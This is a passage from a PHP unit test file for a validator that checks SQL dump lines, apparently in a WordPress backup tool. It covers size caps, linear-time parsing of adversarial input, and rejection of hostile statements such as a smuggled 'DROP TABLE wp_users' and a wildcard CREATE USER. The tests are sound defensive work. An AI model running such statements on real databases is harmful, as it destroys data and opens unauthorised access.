			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB /*!50100 PARTITION BY HASH (`a`) PARTITIONS 4 */;',
			'CREATE TABLE `wp_t` ( `a` int ) ENGINE=InnoDB /*M!100100 x */;',
		) as $line ) {
			$this->bad( $line, $line );
		}
	}

	public function test_line_length_limits() {
		$value = str_repeat( 'x', 600000 );
		$line  = "INSERT INTO `wp_t` VALUES ('" . $value . "');";
		$this->assertSame( 1, $this->ok( $line )['rows'], 'a statement of the size the dump writes (about 512 KB) passes' );

		$big = "INSERT INTO `wp_t` VALUES ('" . str_repeat( 'y', DumpValidator::MAX_LINE_BYTES ) . "');";
		$this->bad( $big, 'longer than 4 MB' );
		$this->bad( '-- ' . str_repeat( 'c', DumpValidator::MAX_LINE_BYTES ), 'a comment over the cap' );

		$exact = "INSERT INTO `wp_t` VALUES ('" . str_repeat( 'z', DumpValidator::MAX_LINE_BYTES - 31 ) . "');";
		$this->assertSame( DumpValidator::MAX_LINE_BYTES, strlen( $exact ) );
		$this->assertSame( 1, $this->ok( $exact )['rows'], 'exactly at the cap' );
		$this->bad( $exact . ' ', 'one byte over' );
	}

	public function test_a_large_hostile_line_is_judged_in_linear_time() {
		// Many escapes and quotes: a backtracking parser would blow up here.
		$value = str_repeat( "\\'''\\\\", 150000 );
		$line  = "INSERT INTO `wp_t` VALUES ('" . $value . "');";
		$start = microtime( true );
		$this->assertSame( 1, $this->ok( $line )['rows'] );
		$this->assertLessThan( 2.0, microtime( true ) - $start );

		$start = microtime( true );
		$this->bad( "INSERT INTO `wp_t` VALUES ('" . str_repeat( "a'b", 200000 ) . "');" );
		$this->assertLessThan( 2.0, microtime( true ) - $start );

		$many  = 'INSERT INTO `wp_t` VALUES ' . implode( ',', array_fill( 0, 60000, '(1,\'a\',NULL,0xAB)' ) ) . ';';
		$start = microtime( true );
		$this->assertSame( 60000, $this->ok( $many )['rows'] );
		$this->assertLessThan( 2.0, microtime( true ) - $start );
	}

	public function test_refusal_messages_never_contain_the_line() {
		$secret = 'TOPSECRET-VALUE-12345';
		foreach ( array(
			"INSERT INTO `wp_t` VALUES ('{$secret}'); DROP TABLE wp_users;",
			"CREATE USER '{$secret}'@'%';",
			"INSERT INTO `{$secret}` VALUES (1);",
			"DROP TABLE IF EXISTS `wp_{$secret}`; --",
			"SET sql_mode='{$secret}';",
		) as $line ) {
			try {
				$this->v->check( $line );
				$this->fail( 'accepted' );
			} catch ( DumpRejectedException $e ) {
				$this->assertStringNotContainsString( $secret, $e->getMessage() );
			}
		}
	}

	public function test_every_statement_shape_of_the_real_dump_writer_passes() {
		$writer_lines = array(
			'SET NAMES utf8mb4;',
			'SET FOREIGN_KEY_CHECKS=0;',
			'SET UNIQUE_CHECKS=0;',
			"SET sql_mode='NO_AUTO_VALUE_ON_ZERO';",
			"SET time_zone='+00:00';",
			'DROP TABLE IF EXISTS `wp_commentmeta`;',
			'CREATE TABLE `wp_commentmeta` ( `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `comment_id` bigint(20) unsigned NOT NULL DEFAULT 0, `meta_key` varchar(255) COLLATE utf8mb4_unicode_520_ci DEFAULT NULL, `meta_value` longtext COLLATE utf8mb4_unicode_520_ci, PRIMARY KEY (`meta_id`), KEY `comment_id` (`comment_id`), KEY `meta_key` (`meta_key`(191)) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;',
			'CREATE TABLE `wp_t2` ( `a` int(11) NOT NULL, `b` decimal(10,2) DEFAULT 1.50, `c` float DEFAULT 1.5, `d` enum(\'x\',\'y\') DEFAULT \'x\', `e` datetime DEFAULT NULL, `f` json DEFAULT NULL, `g` int GENERATED ALWAYS AS (`a` + 1) VIRTUAL, CHECK (`a` > 0), CONSTRAINT `fk` FOREIGN KEY (`a`) REFERENCES `wp_t` (`id`) ON DELETE CASCADE ON UPDATE CASCADE ) ENGINE=MyISAM DEFAULT CHARSET=latin1;',
			'CREATE TABLE `wp_t3` ( `a` int ) ENGINE=Aria;',
			'SET FOREIGN_KEY_CHECKS=1;',
			'SET UNIQUE_CHECKS=1;',
			'-- ovb-dump-end',
		);
		foreach ( $writer_lines as $line ) {
			$this->assertNotSame( '', $this->ok( $line )['kind'], $line );
		}
	}
}
